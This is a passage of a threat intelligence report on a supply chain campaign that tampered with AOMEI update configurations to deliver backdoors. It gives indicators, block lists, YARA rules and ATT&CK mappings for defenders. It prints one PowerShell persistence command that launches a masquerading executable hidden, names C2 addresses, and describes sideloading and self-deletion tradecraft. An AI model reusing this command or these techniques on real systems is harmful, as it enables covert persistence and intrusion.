<p><span style="vertical-align:baseline">In mid-July 2026, following the successful deployment of SHINYROAD, telemetry identified later-stage activity where UNC7017 pushed down ADAPTAGENT, the client portion of the Adaptix C2 post-exploitation framework. To blend in or appear as user-downloaded activity, these payloads masqueraded as Nitro PDF promotional and scanning tools (</span><code style="vertical-align:baseline">NitroPromotion.exe</code><span style="vertical-align:baseline">):</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Persistence:</strong><span style="vertical-align:baseline"> The malware installed a scheduled task named </span><code style="vertical-align:baseline">\NitroRuntime</code><span style="vertical-align:baseline"> that executed:</span></p>
</li>
</ul></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><pre><code>powershell -Command &quot;Start-Process &#39;C:\Users\&lt;USER&gt;\AppData\Local\Temp\NitroPromotion.exe&#39; -WindowStyle Hidden&quot;</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Figure 6: NitroRuntime scheduled task persistence</span></span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Adaptix C2 Beaconing</strong><span style="vertical-align:baseline">: The executable sideloaded </span><code style="vertical-align:baseline">Eztwain4.dll</code><span style="vertical-align:baseline"> (ADAPTAGENT) from </span><code style="vertical-align:baseline">%LOCALAPPDATA%\Nitro Pro\</code><span style="vertical-align:baseline">, which established periodic 2-minute beacons to </span><code style="vertical-align:baseline">8.210.84.56:6800</code><span style="vertical-align:baseline">.</span></p>
</li>
</ul>
<h3><span style="vertical-align:baseline">Outlook and Implications</span></h3>
<p><span style="vertical-align:baseline">This campaign highlights a broader evolution in software supply chain attack methodologies. Supply chain intrusions have historically focused on inserting backdoors into software source code or tampering with developer build pipelines (e.g., </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor"><span style="text-decoration:underline;vertical-align:baseline">SolarWinds</span></a><span style="vertical-align:baseline">, </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise"><span style="text-decoration:underline;vertical-align:baseline">3CX</span></a><span style="vertical-align:baseline">). While highly impactful, compromised source trees leave persistent binary signatures in official release files that can be discovered during post-release binary analysis.</span></p>
<p><span style="vertical-align:baseline">UNC7017's use of ephemeral configuration tampering represents a lower-overhead, higher-stealth alternative:</span></p>
<ol>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Anti-Analysis by Design:</strong><span style="vertical-align:baseline"> By restricting configuration changes to five to ten minute windows, the vast majority of legitimate users and automated repository crawlers only encounter authentic, vendor-signed files.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Selective Exploitation</strong><span style="vertical-align:baseline">: Threat actors can selectively compromise target organizations that maintain frequent polling intervals while minimizing their exposure window on vendor infrastructure.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Dual-Pronged Approach</strong><span style="vertical-align:baseline">: Combining software update redirection with invisible WebDAV NTLM coercion could allow adversaries to harvest credentials from passive users even if binary payload execution is blocked.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Co-opting Commercial Software</strong><span style="vertical-align:baseline">: Deploying unmodified versions of legitimate administration tools (such as Radmin 3.x) to masquerade sideloaded covert channels illustrates how adversaries blend commercial remote management capabilities with hidden backdoor modules.</span></p>
</li>
</ol>
<h3><span style="vertical-align:baseline">Remediation and Hardening</span></h3>
<p><span style="vertical-align:baseline">Defenders should focus on behavioral profiling of updater processes, specifically monitoring for unsigned child processes spawned by background update runners and unauthorized network redirection originating from trusted desktop software. For broader recommendations on securing software delivery pipelines, please refer to our previously published </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise"><span style="text-decoration:underline;vertical-align:baseline">Mitigation Guidance for Supply Chain Compromise</span></a><span style="vertical-align:baseline">.</span></p>
<h4><span style="vertical-align:baseline">Vendor Notification &amp; Architecture Hardening</span></h4>
<p><span style="vertical-align:baseline">On July 17, 2026, Mandiant notified AOMEI Technology regarding the observed configuration tampering on their update infrastructure and provided relevant indicators. AOMEI subsequently responded on July 29, 2026, stating that corrective actions had been taken.</span></p>
<h4><span style="vertical-align:baseline">Why Server-Side Remediation Does Not Disinfect Endpoints</span></h4>
<p><span style="vertical-align:baseline">Crucially, server-side remediation does not clean endpoints that downloaded malicious updates during earlier tampering windows. Because the tampering occurred in brief, short bursts, systems that received these files may remain compromised without the organization's knowledge unless proactive endpoint hunting and remediation are performed.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Persistent Resident Payloads</strong><span style="vertical-align:baseline">: Endpoints that polled for updates during an active tampering window downloaded and staged persistent payloads (via scheduled tasks) that remain fully operational even after the vendor restores authentic .ini files on the origin servers.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Obscured Root Cause</strong><span style="vertical-align:baseline">: While the subsequent backdoor activity and scheduled tasks generate detectable endpoint telemetry, the ephemeral delivery vector obscures the initial intrusion mechanism. Because server tampering lasted approximately 5 minutes—and the loader actively reverted local configuration files—investigators reviewing vendor update URLs hours later will observe only benign, authentic infrastructure, complicating root cause analysis and patient-zero identification.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Hunting Imperative</strong><span style="vertical-align:baseline">: Organizations running AOMEI software cannot assume they are protected solely because the vendor took corrective server-side action. Enterprise security teams must perform retrospective endpoint and network hunts across the entire April–July time frame using the indicators and YARA rules provided in this post.</span></p>
</li>
</ul>
<h4><span style="vertical-align:baseline">Guidance for Software Vendors &amp; Developers</span></h4>
<p><span style="vertical-align:baseline">Software supply chain security extends beyond developer workstations and build pipelines. When desktop software relies on remote configuration files to manage update and notification behaviors, adversaries can target the distribution layer rather than the source code. To defend against configuration tampering and distribution-channel hijacking, software vendors should implement the following security controls:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">End-to-End Cryptographic Signature Verification</strong><span style="vertical-align:baseline">: Client applications must cryptographically verify Authenticode digital signatures and validate vendor certificates on all downloaded executables and archives before extraction or execution. Update clients should never rely solely on transport-layer HTTPS or remote checksums (such as cleartext MD5 values in an unauthenticated configuration file).</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Cryptographically Signed Configuration Files</strong><span style="vertical-align:baseline">: Remote configuration files (.ini, .json, or .xml) should be digitally signed using asymmetric public key cryptography. If an origin server or content delivery network (CDN) is modified without authorization, client software will detect the invalid signature and reject the configuration.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Domain Allowlisting and Destination Pinning</strong><span style="vertical-align:baseline">: Software update clients should enforce strict destination pinning, restricting update downloads exclusively to official, pre-approved vendor domains and CDNs. Update engines should reject redirection to arbitrary third-party domains or generic public cloud storage buckets.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Restricting Uniform Resource Identifier (URI) Schemes in In-App Handlers</strong><span style="vertical-align:baseline">: Embedded web views, promotional popups, and notification handlers should strictly enforce secure web protocols (</span><code style="vertical-align:baseline">https://</code><span style="vertical-align:baseline">) and explicitly disallow local file (</span><code style="vertical-align:baseline">file://</code><span style="vertical-align:baseline">) and UNC WebDAV schemes to prevent external NTLM credential coercion.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Decoupling Core Updates from Marketing Channels</strong><span style="vertical-align:baseline">: Separating essential software maintenance routines from dynamic promotional popups and notification banners reduces the attack surface and ensures that advertising channels cannot trigger local code execution.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Origin Integrity Monitoring and Access Controls</strong><span style="vertical-align:baseline">: Origin web servers and object storage buckets hosting update metadata should enforce strict access controls, multi-factor authentication, and automated real-time file integrity monitoring (FIM) with immediate alerting on configuration changes.</span></p>
</li>
</ul></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="vertical-align:baseline">Guidance for Security Operations (SOC) &amp; Incident Responders</span></h4>
<h4><span style="font-style:italic;vertical-align:baseline">Overcoming the "Point-in-Time" Triage Pitfall</span></h4>
<p><span style="vertical-align:baseline">The short-burst nature of this attack creates a unique challenge for incident response:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">The Triage Trap</strong><span style="vertical-align:baseline">: When an EDR alert fires for a suspicious process spawned by an updater, SOC analysts frequently attempt to validate the alert by navigating to the vendor's download URL or checking URL reputation. Because the threat actor reverted the remote configuration files within five to ten minutes, the vendor's server returns authentic, clean files most of the time, leading analysts to mistakenly dismiss the detection as a false positive.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Actionable IR Protocol</strong><span style="vertical-align:baseline">: Defenders must not rely on live web checks. Incident responders must preserve and analyze the endpoint-cached configuration files in </span><code style="vertical-align:baseline">%PROGRAMFILES(X86)%\AOMEI\*\Tmphtml\</code><span style="vertical-align:baseline"> and review proxy/firewall telemetry corresponding to the precise second the alert was triggered.</span></p>
</li>
</ul>
<h4><span style="font-style:italic;vertical-align:baseline">Camouflaged Follow-on Activity</span></h4>
<p><span style="vertical-align:baseline">The deployment of Adaptix C2 under the guise of Nitro PDF can mislead analysts into treating alerts as isolated, user-initiated software downloads rather than staged lateral movement. Responders must trace updater parentage to identify root-cause supply chain tampering.</span></p>
<h4><span style="vertical-align:baseline">Endpoint and Network Hardening Actions</span></h4>
<h4><span style="font-style:italic;vertical-align:baseline">Endpoint File Checks</span></h4>

<p style="text-align:center"><span style="vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Table 1: Endpoint file checks</span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="font-style:italic;vertical-align:baseline">Scheduled Tasks and Registry</span></h4>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Scheduled Tasks:</strong><span style="vertical-align:baseline"> Check for unauthorized tasks named </span><code style="vertical-align:baseline">\NitroRuntime</code><span style="vertical-align:baseline"> or </span><code style="vertical-align:baseline">\RadminComponentRuntime</code><span style="vertical-align:baseline">.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Registry:</strong><span style="vertical-align:baseline"> Check </span><code style="vertical-align:baseline">\REGISTRY\MACHINE\SYSTEM\Software\Microsoft\TIP\AggregateResults\data</code><span style="vertical-align:baseline"> for unusual binary blobs.</span></p>
</li>
</ul>
<h4><span style="font-style:italic;vertical-align:baseline">Network Defenses</span></h4>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Block outbound network connections to </span><code style="vertical-align:baseline">promotion.storage-data.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">aomei.storage-data.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">storage-data.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">8.210.84.56</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">47.239.60.117</code><span style="vertical-align:baseline">, and </span><code style="vertical-align:baseline">8.218.65.184</code><span style="vertical-align:baseline">.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Block outbound SMB (TCP 445) and WebDAV traffic to external IP addresses to prevent NTLM credential coercion.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Inspect proxy and web gateway logs for the User-Agent </span><code style="vertical-align:baseline">Anyviewer-loader/1.0</code><span style="vertical-align:baseline"> or requests to Alibaba Cloud OSS endpoint </span><code style="vertical-align:baseline">serv.oss-cn-hongkong.aliyuncs.com</code><span style="vertical-align:baseline">.</span></p>
</li>
</ul></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h3><span style="vertical-align:baseline">Indicators of Compromise (IOCs)</span></h3>
<p><span style="vertical-align:baseline">To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a </span><a href="https://www.virustotal.com/gui/collection/dcba624e1f934c2dc047f12161f51397b1603610f7d7a15069c38f0c5bd9e09f" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">GTI Collection</span></a><span style="vertical-align:baseline"> for registered users.</span></p>

<p style="text-align:center"><span style="vertical-align:baseline;color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%">Table 5: Network Indicators</span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="font-style:italic;vertical-align:baseline">Mutexes &amp; Scheduled Tasks</span></h4>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Mutex:</strong><span style="vertical-align:baseline"> </span><code style="vertical-align:baseline">Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}</code></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Shared memory mapping:</strong><span style="vertical-align:baseline"> </span><code style="vertical-align:baseline">Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf</code></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Scheduled Task:</strong><span style="vertical-align:baseline"> </span><code style="vertical-align:baseline">\RadminComponentRuntime</code></p>

<h3><span style="vertical-align:baseline">Google Security Operations (SecOps)</span></h3>
<p><span style="vertical-align:baseline">Google Security Operations customers have access to these broad category rules and more under the "Mandiant Frontline Threats", “Mandiant Hunting Rules”, and "Applied Threat Intelligence - Curated Prioritization" rule packs. The activity discussed in the blog post is detected in Google Security Operations under the rule names:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Explorer Launching Cmd With Powershell Start Process Command</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Suspicious Process Invoking Dllhost Clsid Invocation</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">ATI Active Breach Rule Match for File IoCs</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">ATI High Priority Rule Match for Ip Address IoCs</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">ATI Medium Priority Rule Match for Ip Address IoCs</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Copy System Binary</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">System32 Binary Copied to Non-Standard Directory</span></p>
</li>
</ul></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h3><span style="vertical-align:baseline">Detections</span></h3>
<h4><span style="vertical-align:baseline">YARA Rules</span></h4>
<pre><code>rule G_APT_Downloader_CROSSROAD_1
{
	meta:
		author = &quot;Mandiant&quot;
		desc = &quot;Detects obfuscated and masquerading UNC7017 CROSSROAD downloaders targeting AOMEI software update mechanisms&quot;
		
	strings:
		// Masquerading &amp; Metadata
		$meta_typo = &quot;AOMEI Update Compent&quot; wide
		$meta_co = &quot;AOMEI International Network Limited&quot; wide
		$meta_ver = &quot;8.2.5.0&quot; wide
		$meta_orig = &quot;upgrade-now.exe&quot; wide
		$meta_name = &quot;upgrade-now&quot; wide
		// Embedded Decompression &amp; Downloader Artifacts
		$miniz1 = &quot;archive is too large&quot; ascii
		$miniz2 = &quot;failed finding central directory&quot; ascii
		$miniz3 = &quot;unexpected decompressed size&quot; ascii
		$whttp1 = &quot;WinHttpCrackUrl&quot; ascii
		$whttp2 = &quot;WinHttpSendRequest&quot; ascii
		// Obfuscation &amp; Scheduled Task Artifacts
		$task1 = &quot;RadminComponentRuntime&quot; wide
		$task2 = &quot;Radmin Component runtime checkable.&quot; wide
		$flag = &quot;--runtimechk&quot; wide
		$sob1 = &quot;IsCurrentIpWhitelisted._sob_enc&quot; ascii
		$sob2 = &quot;DownloadFileFromUrlA._sob_enc&quot; ascii
		$sob3 = &quot;WinMain._sob_enc.&quot; ascii
		$obf_key = &quot;_sob_key&quot; ascii
	condition:
		uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize &lt; 5MB and (
			(($meta_typo or ($meta_co and ($meta_orig or $meta_name or $meta_ver))) and
			 any of ($miniz*) and
			 any of ($whttp*)) or
			(2 of ($sob*) and ($task1 or $flag)) or
			($obf_key and $task1 and $task2 and any of ($sob*))
		)
}
</code></pre>
<pre><code>rule G_APT_Backdoor_SHINYROAD_1
{
	meta:
		author = &quot;Mandiant&quot;
		desc = &quot;Detects the SHINYROAD BlkScrDl.dll COM-staging loader and RuntimeComponent.dll PocketPy engine&quot;
		
	strings:
		// Shared SHINYROAD artifacts (shared memory section and mutex)
		$shm = &quot;Local\\963d3c60-d406-4ad6-aa1e-dc8e45061ccf&quot; ascii wide
		$mtx = &quot;Global\\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}&quot; ascii wide
		// BlkScrDl.dll loader: config.zip staging and COM server registration
		$ld1 = &quot;%sconfig.zip&quot; ascii
		$ld2 = &quot;%scsvc\\RuntimeComponent.dll&quot; ascii
		$ld3 = &quot;libBlkScrDl.dll&quot; ascii
		$com1 = &quot;Software\\Classes\\CLSID\\%s&quot; ascii
		$com2 = &quot;Software\\Classes\\AppID\\%s&quot; ascii
		$com3 = &quot;%s\\InprocServer32&quot; ascii
		// RuntimeComponent.dll embedded PocketPy engine
		$rc1 = &quot;libRuntimeComponent.dll&quot; ascii
		$rc2 = &quot;metadata.dat&quot; ascii
		$rc3 = &quot;_pyio_compat&quot; ascii
		$rc4 = &quot;_pyio_struct&quot; ascii
		$rc5 = &quot;%sdemo_srv.log&quot; ascii
	condition:
		uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize &lt; 5MB and (
			($shm and $mtx) or
			(($shm or $mtx) and (2 of ($ld*) or 2 of ($rc*))) or
			(2 of ($ld*) and 2 of ($com*)) or
			($rc1 and $rc2 and any of ($rc3, $rc4, $rc5))
		)
}
</code></pre></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><pre><code>rule G_APT_Backdoor_SHINYROAD_2
{
	meta:
		author = &quot;Mandiant&quot;
		desc = &quot;Detects compiled PocketPy bytecode payloads associated with SHINYROAD backdoors&quot;

	strings:
		$pkpy_magic = { 4F 43 01 00 }
		$proto1 = &quot;mct3-handshake-v1&quot; ascii
		$script = &quot;bootstrap_tcp_slim_v2_call_min.py&quot; ascii
		$jam1 = &quot;JAM_BURST_PACKETS_MIN&quot; ascii
		$jam2 = &quot;JAM_MIN_MS&quot; ascii
		$jam3 = &quot;JAM_MAX_BYTES&quot; ascii
		$mod1 = &quot;_pyio_struct&quot; ascii
		$mod2 = &quot;_pyio_compat&quot; ascii
		$enc1 = &quot;nh_enc&quot; ascii
		$enc2 = &quot;encbody&quot; ascii

	condition:
		$pkpy_magic at 0 and filesize &lt; 500KB and (
			$proto1 or
			$script or
			all of ($jam*) or
			(all of ($mod*) and any of ($enc*))
		)
}</code></pre>
<pre><code>rule G_APT_Launcher_ADAPTAGENT_1
{
	meta:
		author = &quot;Mandiant&quot;
		desc = &quot;Detects UNC7017 ADAPTAGENT post-exploitation loader and sideloaded Adaptix payload (Nitro camouflage)&quot;
		ref = &quot;https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering&quot;
		platforms = &quot;Win&quot;
		rs1 = &quot;14b31918075e6130b9123158743db0a81e2d7bfcf6d39731ee7d9200a98cd591&quot;

	strings:
		// Sideloaded Masquerading &amp; Camouflage
		$camo_exe1 = &quot;NitroPromotion.exe&quot; ascii wide nocase
		$camo_exe2 = &quot;Nitro_Scan2PDFApp.exe&quot; ascii wide nocase
		$camo_dll1 = &quot;Eztwain4.dll&quot; ascii wide nocase
		$camo_dll2 = &quot;Nitro PDF Eztwain4&quot; ascii wide nocase
		$camo_ver = &quot;14.10.1.0&quot; ascii wide
		$camo_copy = &quot;Nitro Software, Inc.&quot; ascii wide

		// NitroPromotion Loader &amp; Staging Functionality
		$load1 = &quot;DownloadToLocalAppData&quot; ascii
		$load2 = &quot;ExtractZipToDirectoryA&quot; ascii
		$load3 = &quot;GetTempZipFileNameA&quot; ascii
		$load4 = &quot;CreateScheduledTask&quot; ascii

		// Adaptix C2 &amp; ADAPTAGENT Core Artifacts
		$adapt1 = &quot;Adaptix Crash Analyzer v1.0&quot; ascii
		$adapt2 = &quot;Global\\{8d00c640-48d8-4440-a8e1-660fd37f572a}&quot; ascii wide
		$adapt3 = &quot;\\\\.\\pipe\\%08lx&quot; ascii
		$adapt4 = &quot;13ConnectorHTTP&quot; ascii
		$adapt5 = &quot;9Connector&quot; ascii

	condition:
		uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize &lt; 10MB and (
			// Branch 1: ADAPTAGENT Sideloaded Payload (Eztwain4.dll)
			(any of ($camo_dll*, $adapt1, $adapt2) and 2 of ($adapt*)) or

			// Branch 2: NitroPromotion Masquerading Loader (NitroPromotion.exe)
			(any of ($camo_exe*) and (2 of ($load*) or any of ($adapt1, $adapt2))) or
			(all of ($camo_ver, $camo_copy) and any of ($camo_exe*) and any of ($load*))
		)
}</code></pre></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h3><span style="vertical-align:baseline">MITRE ATT&amp;CK Techniques</span></h3>

<p><span style="vertical-align:baseline">Defense Evasion</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1574/001/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1574.001</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Hijack Execution Flow: DLL</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Search-order hijacking of </span><code style="vertical-align:baseline">BlkScrDl.dll</code><span style="vertical-align:baseline"> by the signed </span><code style="vertical-align:baseline">FamItrfc.exe</code><span style="vertical-align:baseline">, and side-loading of </span><code style="vertical-align:baseline">Eztwain4.dll</code><span style="vertical-align:baseline"> by the Nitro PDF masquerading loaders.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Defense Evasion</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1480/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1480</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Execution Guardrails</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Validation of the </span><code style="vertical-align:baseline">AOMEI</code><span style="vertical-align:baseline"> directory substring and external IP reflection filtering before secondary payload retrieval.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Defense Evasion</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1036/005/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1036.005</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Masquerading: Match Legitimate Resource Name or Location</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><code style="vertical-align:baseline">BlkScrDl.dll</code><span style="vertical-align:baseline"> masquerades as Radmin's legitimate "blank screen" driver library; ADAPTAGENT loaders masquerade as Nitro PDF tools (</span><code style="vertical-align:baseline">NitroPromotion.exe</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">Eztwain4.dll</code><span style="vertical-align:baseline">).</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Defense Evasion</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1027/013/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1027.013</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Obfuscated Files or Information: Encrypted/Encoded File</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">SHINYROAD stage-2 Python bytecode stored as ChaCha20-encrypted </span><code style="vertical-align:baseline">metadata.dat</code><span style="vertical-align:baseline"> inside </span><code style="vertical-align:baseline">config.zip</code><span style="vertical-align:baseline">.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Defense Evasion</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1140/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1140</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Deobfuscate/Decode Files or Information</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><code style="vertical-align:baseline">RuntimeComponent.dll</code><span style="vertical-align:baseline"> decrypts </span><code style="vertical-align:baseline">metadata.dat</code><span style="vertical-align:baseline"> in memory using ChaCha20 with an HMAC-SHA256 derived key and IV.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Defense Evasion</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1070/004/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1070.004</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Indicator Removal: File Deletion</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Self-deletion of CROSSROAD (</span><code style="vertical-align:baseline">upgrade-now.exe</code><span style="vertical-align:baseline">) via a child process spawned with </span><code style="vertical-align:baseline">--nitrod</code><span style="vertical-align:baseline">.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Defense Evasion</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1564/004/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1564.004</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Hide Artifacts: NTFS File Attributes</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">CROSSROAD renames its primary </span><code style="vertical-align:baseline">:$DATA</code><span style="vertical-align:baseline"> stream to an alternate data stream named </span><code style="vertical-align:baseline">:wtfbbq</code><span style="vertical-align:baseline"> before flagging the file for deletion on handle close.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Credential Access</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1187/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1187</span></a></p>
</td>
